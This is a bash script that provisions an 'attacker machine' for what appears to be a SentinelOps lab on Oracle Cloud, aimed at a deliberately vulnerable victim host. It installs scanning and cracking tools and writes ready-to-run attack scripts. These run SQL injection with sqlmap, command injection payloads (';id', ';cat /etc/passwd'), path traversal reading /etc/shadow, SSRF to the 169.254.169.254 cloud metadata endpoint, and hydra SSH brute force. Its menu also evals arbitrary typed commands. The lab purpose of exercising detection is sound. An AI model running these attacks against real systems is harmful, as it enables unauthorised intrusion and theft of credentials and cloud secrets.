#!/bin/bash
# =============================================================================
# SentinelOps - Attacker Machine Setup Script for OCI
# =============================================================================
# This script sets up the Attacker machine with penetration testing tools
# Run as root or with sudo
# =============================================================================

set -e

VICTIM_IP=${1:-"10.0.1.20"}

echo "
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   💀 SentinelOps - Attacker Machine Setup (OCI)                   ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"

# =============================================================================
# System Update
# =============================================================================
echo "[1/5] Updating system packages..."
dnf update -y
dnf install -y epel-release
dnf install -y curl wget git vim unzip python3 python3-pip make gcc

# =============================================================================
# Install Security Tools
# =============================================================================
echo "[2/5] Installing security/pentesting tools..."

# Network scanning
dnf install -y nmap nmap-ncat

# Web scanning
dnf install -y nikto

# Password cracking
dnf install -y hydra john

# Install sqlmap
cd /opt
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
ln -sf /opt/sqlmap/sqlmap.py /usr/local/bin/sqlmap

# Install gobuster
wget https://github.com/OJ/gobuster/releases/download/v3.6.0/gobuster_Linux_x86_64.tar.gz
tar xzf gobuster_Linux_x86_64.tar.gz -C /usr/local/bin/
rm gobuster_Linux_x86_64.tar.gz

# Install nuclei
wget https://github.com/projectdiscovery/nuclei/releases/download/v3.1.0/nuclei_3.1.0_linux_amd64.zip
unzip nuclei_3.1.0_linux_amd64.zip -d /usr/local/bin/
rm nuclei_3.1.0_linux_amd64.zip

# Update nuclei templates
nuclei -update-templates

# Install Python security tools
pip3 install impacket
pip3 install requests beautifulsoup4
pip3 install pwntools

# Install wordlists
mkdir -p /usr/share/wordlists
cd /usr/share/wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/common.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt

echo "✅ Security tools installed"

# =============================================================================
# Create Attack Scripts
# =============================================================================
echo "[3/5] Creating attack scripts..."

mkdir -p /opt/attack-scripts
cd /opt/attack-scripts

# Main attack runner
cat > run_all_attacks.sh << 'EOF'
#!/bin/bash
# =============================================================================
# SentinelOps - Attack Simulation Runner
# =============================================================================

VICTIM_IP=${1:-"VICTIM_IP_PLACEHOLDER"}
OUTPUT_DIR="./results_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "
╔═══════════════════════════════════════════════════════════════════╗
║  🎯 Starting Attack Simulation Against: $VICTIM_IP                ║
╚═══════════════════════════════════════════════════════════════════╝
"

# Phase 1: Reconnaissance
echo "[Phase 1] Reconnaissance..."
./01_recon.sh $VICTIM_IP $OUTPUT_DIR

# Phase 2: Vulnerability Scanning
echo "[Phase 2] Vulnerability Scanning..."
./02_vuln_scan.sh $VICTIM_IP $OUTPUT_DIR

# Phase 3: Web Application Testing
echo "[Phase 3] Web Application Testing..."
./03_web_attacks.sh $VICTIM_IP $OUTPUT_DIR

# Phase 4: Brute Force Attempts
echo "[Phase 4] Brute Force Testing..."
./04_brute_force.sh $VICTIM_IP $OUTPUT_DIR

# Phase 5: Exploitation Attempts
echo "[Phase 5] Exploitation..."
./05_exploitation.sh $VICTIM_IP $OUTPUT_DIR

echo "
╔═══════════════════════════════════════════════════════════════════╗
║  ✅ Attack simulation complete!                                    ║
║  Results saved to: $OUTPUT_DIR                                     ║
╚═══════════════════════════════════════════════════════════════════╝
"
EOF

sed -i "s/VICTIM_IP_PLACEHOLDER/${VICTIM_IP}/" run_all_attacks.sh

# Reconnaissance script
cat > 01_recon.sh << 'EOF'
#!/bin/bash
VICTIM_IP=$1
OUTPUT_DIR=$2

echo "[*] Running port scan..."
nmap -sV -sC -oN $OUTPUT_DIR/nmap_full.txt $VICTIM_IP

echo "[*] Running aggressive scan..."
nmap -A -T4 -oN $OUTPUT_DIR/nmap_aggressive.txt $VICTIM_IP

echo "[*] UDP scan (top ports)..."
nmap -sU --top-ports 100 -oN $OUTPUT_DIR/nmap_udp.txt $VICTIM_IP

echo "[✓] Reconnaissance complete"
EOF

# Vulnerability scanning script
cat > 02_vuln_scan.sh << 'EOF'
#!/bin/bash
VICTIM_IP=$1
OUTPUT_DIR=$2

echo "[*] Running Nikto web scanner..."
nikto -h http://$VICTIM_IP:8080 -o $OUTPUT_DIR/nikto_8080.txt || true
nikto -h http://$VICTIM_IP:3000 -o $OUTPUT_DIR/nikto_3000.txt || true

echo "[*] Running Nuclei scanner..."
nuclei -u http://$VICTIM_IP:8080 -o $OUTPUT_DIR/nuclei_8080.txt || true
nuclei -u http://$VICTIM_IP:3000 -o $OUTPUT_DIR/nuclei_3000.txt || true

echo "[*] Directory enumeration..."
gobuster dir -u http://$VICTIM_IP:8080 -w /usr/share/wordlists/common.txt -o $OUTPUT_DIR/gobuster_8080.txt || true

echo "[✓] Vulnerability scanning complete"
EOF

# Web application attacks
cat > 03_web_attacks.sh << 'EOF'
#!/bin/bash
VICTIM_IP=$1
OUTPUT_DIR=$2

echo "[*] Testing SQL Injection..."
# DVWA SQL Injection
sqlmap -u "http://$VICTIM_IP:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --batch --level=2 --risk=2 \
    --output-dir=$OUTPUT_DIR/sqlmap || true

# Custom vulnerable app
sqlmap -u "http://$VICTIM_IP:8083/user?id=1" \
    --batch --level=2 --risk=2 \
    --output-dir=$OUTPUT_DIR/sqlmap_custom || true

echo "[*] Testing XSS..."
curl -s "http://$VICTIM_IP:8083/search?q=<script>alert('XSS')</script>" > $OUTPUT_DIR/xss_test.txt

echo "[*] Testing Command Injection..."
curl -s "http://$VICTIM_IP:8083/ping?host=localhost;id" > $OUTPUT_DIR/cmd_injection.txt
curl -s "http://$VICTIM_IP:8083/ping?host=localhost;cat%20/etc/passwd" >> $OUTPUT_DIR/cmd_injection.txt

echo "[*] Testing Path Traversal..."
curl -s "http://$VICTIM_IP:8083/file?name=../../../etc/passwd" > $OUTPUT_DIR/path_traversal.txt

echo "[✓] Web attacks complete"
EOF

# Brute force script
cat > 04_brute_force.sh << 'EOF'
#!/bin/bash
VICTIM_IP=$1
OUTPUT_DIR=$2

echo "[*] SSH brute force (limited attempts for demo)..."
hydra -l admin -P /usr/share/wordlists/10k-most-common.txt \
    -t 4 -V -f \
    ssh://$VICTIM_IP \
    2>&1 | head -50 > $OUTPUT_DIR/hydra_ssh.txt || true

echo "[*] HTTP login brute force..."
# DVWA default credentials test
curl -c cookies.txt -s "http://$VICTIM_IP:8080/login.php" > /dev/null
curl -b cookies.txt -s -X POST \
    -d "username=admin&password=password&Login=Login" \
    "http://$VICTIM_IP:8080/login.php" > $OUTPUT_DIR/dvwa_login.txt

echo "[✓] Brute force testing complete"
EOF

# Exploitation script
cat > 05_exploitation.sh << 'EOF'
#!/bin/bash
VICTIM_IP=$1
OUTPUT_DIR=$2

echo "[*] Attempting SSRF exploitation..."
curl -s "http://$VICTIM_IP:8083/fetch?url=http://169.254.169.254/latest/meta-data/" > $OUTPUT_DIR/ssrf_test.txt
curl -s "http://$VICTIM_IP:8083/fetch?url=http://localhost:8080/" >> $OUTPUT_DIR/ssrf_test.txt

echo "[*] Attempting to extract sensitive data..."
# Try to read sensitive files via path traversal
for file in /etc/passwd /etc/shadow /proc/version /etc/hostname; do
    curl -s "http://$VICTIM_IP:8083/file?name=../../..${file}" >> $OUTPUT_DIR/file_extraction.txt 2>/dev/null
    echo "---" >> $OUTPUT_DIR/file_extraction.txt
done

echo "[*] Testing for RCE via command injection..."
curl -s "http://$VICTIM_IP:8083/ping?host=localhost;whoami" > $OUTPUT_DIR/rce_test.txt
curl -s "http://$VICTIM_IP:8083/ping?host=localhost;uname%20-a" >> $OUTPUT_DIR/rce_test.txt

echo "[✓] Exploitation testing complete"
EOF

# Make all scripts executable
chmod +x *.sh

echo "✅ Attack scripts created"

# =============================================================================
# Configure Firewall
# =============================================================================
echo "[4/5] Configuring firewall..."

systemctl enable firewalld
systemctl start firewalld

firewall-cmd --permanent --add-port=22/tcp
firewall-cmd --reload

echo "✅ Firewall configured"

# =============================================================================
# Create Helper Scripts
# =============================================================================
echo "[5/5] Creating helper scripts..."

cat > /root/quick-scan.sh << EOF
#!/bin/bash
# Quick scan helper
TARGET=\${1:-${VICTIM_IP}}
echo "Quick scanning \$TARGET..."
nmap -T4 -F \$TARGET
EOF

cat > /root/attack-menu.sh << 'EOF'
#!/bin/bash
echo "
╔═══════════════════════════════════════════════════════════════════╗
║  SentinelOps Attack Menu                                          ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  1. Run full attack simulation                                    ║
║  2. Quick port scan                                               ║
║  3. Web vulnerability scan (Nikto)                                ║
║  4. SQL Injection test                                            ║
║  5. Brute force SSH                                               ║
║  6. Custom command                                                ║
║  0. Exit                                                          ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"
read -p "Select option: " choice

VICTIM_IP="${VICTIM_IP:-10.0.1.20}"

case $choice in
    1) cd /opt/attack-scripts && ./run_all_attacks.sh $VICTIM_IP ;;
    2) nmap -T4 -F $VICTIM_IP ;;
    3) nikto -h http://$VICTIM_IP:8080 ;;
    4) sqlmap -u "http://$VICTIM_IP:8083/user?id=1" --batch ;;
    5) hydra -l admin -P /usr/share/wordlists/10k-most-common.txt ssh://$VICTIM_IP -t 4 -V ;;
    6) read -p "Enter command: " cmd && eval $cmd ;;
    0) exit 0 ;;
    *) echo "Invalid option" ;;
esac
EOF

chmod +x /root/*.sh

# =============================================================================
# Summary
# =============================================================================
ATTACKER_IP=$(hostname -I | awk '{print $1}')

echo "
╔═══════════════════════════════════════════════════════════════════╗
║  ✅ Attacker Machine Setup Complete!                              ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  Installed Tools:                                                 ║
║  ├── nmap (Network scanner)                                       ║
║  ├── nikto (Web scanner)                                          ║
║  ├── sqlmap (SQL injection)                                       ║
║  ├── hydra (Brute force)                                          ║
║  ├── gobuster (Directory enumeration)                             ║
║  ├── nuclei (Vulnerability scanner)                               ║
║  └── Various Python tools                                         ║
║                                                                   ║
║  Attack Scripts: /opt/attack-scripts/                             ║
║  Wordlists:      /usr/share/wordlists/                            ║
║                                                                   ║
║  Quick Commands:                                                  ║
║  ├── /root/attack-menu.sh     - Interactive attack menu           ║
║  ├── /root/quick-scan.sh      - Quick port scan                   ║
║  └── ./run_all_attacks.sh     - Full attack simulation            ║
║                                                                   ║
║  Target Victim: ${VICTIM_IP}                                      ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"
